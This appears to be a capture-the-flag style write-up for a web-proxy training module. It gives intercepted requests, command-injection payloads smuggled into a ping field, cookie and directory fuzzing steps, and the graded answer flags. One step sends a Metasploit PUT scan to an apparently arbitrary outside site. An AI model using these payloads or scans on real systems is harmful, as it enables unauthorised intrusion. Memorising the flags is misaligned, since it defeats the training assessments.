@@ -1,0 +1,356 @@
+[Intercepting Web Requests]
+
+[*] Target: 138.68.170.86:31296
+
+[Question 1] Try intercepting the ping request on the server shown above, and change the post data similarly to what we did in this section. Change the command to read 'flag.txt'
+
+    [Step 1] Intercepting the ping request
+
+            POST /ping HTTP/1.1
+            Host: 138.68.170.86:31296
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            ...
+            Referer: http://138.68.170.86:31296/
+            Upgrade-Insecure-Requests: 1
+
+            ip=1
+
+    [Step 2] Read the "flag.txt" using the command injection
+
+        -   Change a little bit ("... ip=1;cat+flag.txt") then forward the request => "... HTB{1n73rc3p73d_1n_7h3_m1ddl3}"
+
+    [!] Answer: "HTB{1n73rc3p73d_1n_7h3_m1ddl3}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Repeating Requests]
+
+[*] Target: 157.245.41.35:31873
+
+[Question 1] Try using request repeating to be able to quickly test commands. With that, try looking for the other flag.
+
+    [Step 1] Intercepting the ping request
+
+            POST /ping HTTP/1.1
+            Host: 138.68.170.86:31296
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            ...
+            Referer: http://138.68.170.86:31296/
+            Upgrade-Insecure-Requests: 1
+
+            ip=1
+
+    [Step 2] Find the other "flag.txt" using the command injection
+
+        -   Change a little bit ("... ip=1;find+/+-name+flag.txt+2>/dev/null") then forward the request
+
+            HTTP/1.1 200 OK
+            X-Powered-By: Express
+            Date: Fri, 05 May 2023 09:25:51 GMT
+            Connection: close
+            Content-Length: 284
+
+            PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
+            64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.019 ms
+
+            --- 127.0.0.1 ping statistics ---
+            1 packets transmitted, 1 received, 0% packet loss, time 0ms
+            rtt min/avg/max/mdev = 0.019/0.019/0.019/0.000 ms
+            
+            /var/www/html/flag.txt
+            /flag.txt
+
+    [Step 3] Read the "flag.txt" using the command injection
+
+        -   In the "Intercepting Web Requests" 's question => we read the "/var/www/html/flag.txt"
+
+        -   Change a little bit ("... ip=1;cat+/flag.txt") then forward the request => "... HTB{qu1ckly_r3p3471n6_r3qu3575}"
+
+    [!] Answer: "HTB{qu1ckly_r3p3471n6_r3qu3575}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Encoding/Decoding]
+
+[*] Attached file: "encoded_flag.zip"
+
+[Question 1] The string found in the attached file has been encoded several times with various encoders. Try to use the decoding tools we discussed to decode it and get the flag.
+
+    [Step 1] Download and Extract the "encoded_flag.zip"
+
+        => "VTJ4U1VrNUZjRlZXVkVKTFZrWkdOVk5zVW10aFZYQlZWRmh3UzFaR2NITlRiRkphWld0d1ZWUllaRXRXUm10M1UyeFNUbVZGY0ZWWGJYaExWa1V3ZVZOc1VsZGlWWEJWVjIxNFMxWkZNVFJUYkZKaFlrVndWVmR0YUV0V1JUQjNVMnhTYTJGM1BUMD0="
+
+    [Step 2] Using any hash identifier then decode until it's done
+
+        -   After decoding base64 four times, you just need to decode URL 1 more time to have this _ "HTB{3nc0d1n6_n1nj4}"
+
+    [!] Answer: "HTB{3nc0d1n6_n1nj4}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Proxying Tools]
+ 
+[Question 1]  Try running 'auxiliary/scanner/http/http_put' in Metasploit on any website, while routing the traffic through Burp. Once you view the requests sent, what is the last line in the request?
+
+    [Step 1] Configure proxy for "auxiliary/scanner/http/http_put"
+
+        ...
+        msf6 auxiliary(scanner/http/http_put) > set Proxies HTTP:127.0.0.1:8080
+        ...
+
+    [Step 2] Intercepting the request 
+
+            PUT /random/msf_http_put_test.txt HTTP/1.1
+            Host: 119.17.215.232
+            User-Agent: Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Mobile/15E148 Safari/604.1
+            Content-Type: text/plain
+            Content-Length: 13
+            Connection: close
+
+            msf test file
+
+    [!] Answer: "msf test file"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Burp Intruder]
+
+[*] Target: 157.245.41.35:31799
+
+[Question 1]  Use Burp Intruder to fuzz for '.html' files under the /admin directory, to find a file containing the flag.
+
+    [Step 1] Intercepting the request to /admin drirectory then specify the brute forced target
+
+            GET /admin/§Brute-Force-Target§.html HTTP/1.1
+            Host: 157.245.41.35:31799
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Connection: close
+            Upgrade-Insecure-Requests: 1
+            If-Modified-Since: Wed, 14 Oct 2020 19:34:04 GMT
+            If-None-Match: "0-5b1a69d390300"
+
+    [Step 2] Using ../SecLists/Discovery/Web-Content/common.txt then find out what is available filename
+
+        => "2010": Status code 200 OK
+
+        => "... HTB{burp_1n7rud3r_fuzz3r!} ..."
+
+    [!] Answer: "HTB{burp_1n7rud3r_fuzz3r!}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[ZAP Fuzzer]
+
+[*] Target: 157.245.41.35:32098
+
+[Question 1]  The directory we found above sets the cookie to the md5 hash of the username, as we can see the md5 cookie in the request for the (guest) user.
+              Visit '/skills/' to get a request with a cookie, then try to use ZAP Fuzzer to fuzz the cookie for different md5 hashed usernames to get the flag. 
+              (Note: Use the "top-usernames-shortlist.txt" wordlist from Seclists)
+
+[*] ZAP is a good tool but Burp Suite Pro is much more better, so in this CBBH Writeup I will use Burp Suite Pro most of the time
+
+    [Step 1] Get our default cookie in /skills directory
+
+            GET /skills/ HTTP/1.1
+            Host: 157.245.41.35:32098
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Connection: close
+            Cookie: cookie=084e0343a0486ff05530df6c705c8bb4
+            Upgrade-Insecure-Requests: 1
+
+            => We already know that "084e0343a0486ff05530df6c705c8bb4" is "guest" but MD5 hashed
+
+    [Step 2] Specify the brute forced target and use ../SecLists/Usernames/top-usernames-shortlist.txt then find out what is available username
+
+            GET /skills/ HTTP/1.1
+            Host: 157.245.41.35:32098
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Connection: close
+            Cookie: cookie=§084e0343a0486ff05530df6c705c8bb4§
+            Upgrade-Insecure-Requests: 1
+
+        -   Set ../SecLists/Usernames/top-usernames-shortlist.txt as your "Payload Option" Also add hash MD5 in your "Payload Processing"
+            
+            HTTP/1.1 200 OK
+            Date: Sat, 06 May 2023 02:57:15 GMT
+            Server: Apache/2.4.41 (Ubuntu)
+            Set-Cookie: cookie=084e0343a0486ff05530df6c705c8bb4
+            Vary: Accept-Encoding
+            Content-Length: 450
+            Connection: close
+            Content-Type: text/html; charset=UTF-8
+
+            <!DOCTYPE html>
+            <html lang="en">
+            ...
+            HTB{fuzz1n6_my_f1r57_c00k13}
+            ...
+            </html>
+
+    [!] Answer: "HTB{fuzz1n6_my_f1r57_c00k13}"
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[ZAP Scanner]
+
+[*] Target: 157.245.41.35:30156
+
+[Question 1] Run ZAP Scanner on the target above to identify directories and potential vulnerabilities. Once you find the high-level vulnerability, try to use it to read the flag at '/flag.txt'
+
+    -   Go to Dashboard > "New scan", then there are 2 options for you to choose
+
+        [?] Crawl: Allows you to automatically browse and map the structure of a website.
+
+        [?] Crawl and audit: Not only visit each page on the website and identify all the links and resources associated with it, but it will also test each page for vulnerabilities based on the scan configuration you set up
+
+    => In this case you should choose "Crawl and audit" and then enter the target in "URLs to Scan"
+
+    => After 15 minutes scan, I found this _ an issue type "OS command injection"
+
+    Request:
+
+        GET /devtools/ping.php?ip=127.0.0.1%7cecho%20fgamcctnhf%207mc3hjzdi1%7c%7ca%20%23'%20%7cecho%20fgamcctnhf%207mc3hjzdi1%7c%7ca%20%23%7c%22%20%7cecho%20fgamcctnhf%207mc3hjzdi1%7c%7ca%20%23 HTTP/1.1
+        Host: 157.245.41.35:30156
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Accept-Language: en-US;q=0.9,en;q=0.8
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36
+        Connection: close
+        Cache-Control: max-age=0
+        Referer: http://157.245.41.35:30156/index.php/2021/08/11/customer-support/
+
+    Response:
+
+        HTTP/1.1 200 OK
+        Date: Sat, 06 May 2023 04:07:25 GMT
+        Server: Apache/2.4.41 (Ubuntu)
+        Vary: Accept-Encoding
+        Content-Length: 145
+        Connection: close
+        Content-Type: text/html; charset=UTF-8
+
+        <!DOCTYPE html>
+        ...
+        <body>
+        fgamcctnhf 7mc3hjzdi1
+        </body>
+        </html>
+
+    => "GET /devtools/ping.php?ip=127.0.0.1;find+/+-name+flag.txt+2>/dev/null HTTP/1.1 ..." => "... /flag.txt ..."
+
+    => "GET /devtools/ping.php?ip=127.0.0.1;cat+/flag.txt HTTP/1.1 ..." => "...  HTB{5c4nn3r5_f1nd_vuln5_w3_m155} ..."
+
+    [!] Answer: HTB{5c4nn3r5_f1nd_vuln5_w3_m155}
+
+
+************************************************************************************************************************************************************************************************************************************************************
+
+
+[Skills Assessment - Using Web Proxies]
+
+[*] Target: 157.245.38.221:31961
+
+[Question 1] The /lucky.php page has a button that appears to be disabled. Try to enable the button, and then click it to get the flag.
+
+    -   Go to view-source:http://157.245.38.221:31961/lucky.php
+
+        <!DOCTYPE html>
+        ...
+        <body>
+            <form name='getflag' class='form' method='post' id='form1'>
+                <button class='btn block-cube block-cube-hover' id='submit' type='submit' formmethod='post' name='getflag' value='true' disabled="">
+        ...
+        </body>
+
+        </html>
+
+        => As you can see the button has a class 'btn block-cube block-cube-hover', and a disabled attribute, which means that it cannot be clicked or used until the disabled attribute is removed or changed to false. 
+
+        => "... <button class='btn block-cube block-cube-hover' id='submit' type='submit' formmethod='post' name='getflag' value='true'> ..."
+
+    -   Intercepting this request and send it to Repeater => you know the HTB flag's concept right, so you need to search for "HTB{" in the response search bar => Try to send until you see "1 matched" => "... HTB{d154bl3d_bu770n5_w0n7_570p_m3} ..."
+
+    [!] Answer: "HTB{d154bl3d_bu770n5_w0n7_570p_m3}"
+
+[Question 2] The /admin.php page uses a cookie that has been encoded multiple times. Try to decode the cookie until you get a value with 31 characters. Submit the value as the answer.
+
+    [Step 1] Intercepting the request to /admin.php
+
+            GET /admin.php HTTP/1.1
+            Host: 157.245.38.221:31961
+            User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+            Accept-Language: en-US,en;q=0.5
+            Accept-Encoding: gzip, deflate
+            Connection: close
+            Cookie: PHPSESSID=mgh9l3ii94eppedb4nme1ojsuq; cookie=4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d
+            Upgrade-Insecure-Requests: 1
+
+        => "4d325268597a6b7a596a686a5a4449314d4746684f474d7859544d325a6d5a6d597a63355954453359513d3d" is the thing we need
+
+    [Step 2] Using the Hash Intruder tool then decode until it's done
+
+        -   After Hex decoded > Base64 decoded => "3dac93b8cd250aa8c1a36fffc79a17a"
+
+    [!] Answer: "3dac93b8cd250aa8c1a36fffc79a17a"
+
+[Question 3] Once you decode the cookie, you will notice that it is only 31 characters long, which appears to be an md5 hash missing its last character
+             So, try to fuzz the last character of the decoded md5 cookie with all alpha-numeric characters, while encoding each request with the encoding methods you identified above.
+             (Note: You may use the "alphanum-case.txt" wordlist from Seclist for the payload )
+
+    -   This should be easy, they already show us the mindset to solve this problem, all you need to do is follow my tutorial
+
+    [Tutorial] Specify the brute forced target and use ../SecLists/Fuzzing/alphanum-case.txt then find out what is the available cookie
+
+        -   Load ../SecLists/Fuzzing/alphanum-case.txt in your Payload options
+
+        -   In Payload Processing:
+
+            1. Add Prefix: 3dac93b8cd250aa8c1a36fffc79a17a
+
+            2. Add Encode: Base64-encode
+
+            3. Add Encode: Encode as ASCII hex
+
+        => Check for responses' content length, which is equal to 1248 will contain the flag => "... HTB{burp_1n7rud3r_n1nj4!} ..."
+
+    [!] Answer: "HTB{burp_1n7rud3r_n1nj4!}"
+
+[Question 4] You are using the 'auxiliary/scanner/http/coldfusion_locale_traversal' tool within Metasploit, but it is not working properly for you. You decide to capture the request sent by Metasploit so you can manually verify it and repeat it. 
+             Once you capture the request, what is the 'XXXXX' directory being called in '/XXXXX/administrator/..'?
+
+    [Step 1] Set proxies for auxiliary/scanner/http/coldfusion_locale_traversal
+
+        ...
+        msf6 auxiliary(scanner/http/coldfusion_locale_traversal) > set Proxies HTTP:127.0.0.1:8080
+        ...
+
+    [Step 2] Intercepting this request
+
+        GET /CFIDE/administrator/index.cfm HTTP/1.1
+        Host: 157.245.38.221:31961
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+        Connection: close
+
+    [!] Answer: "CFIDE"
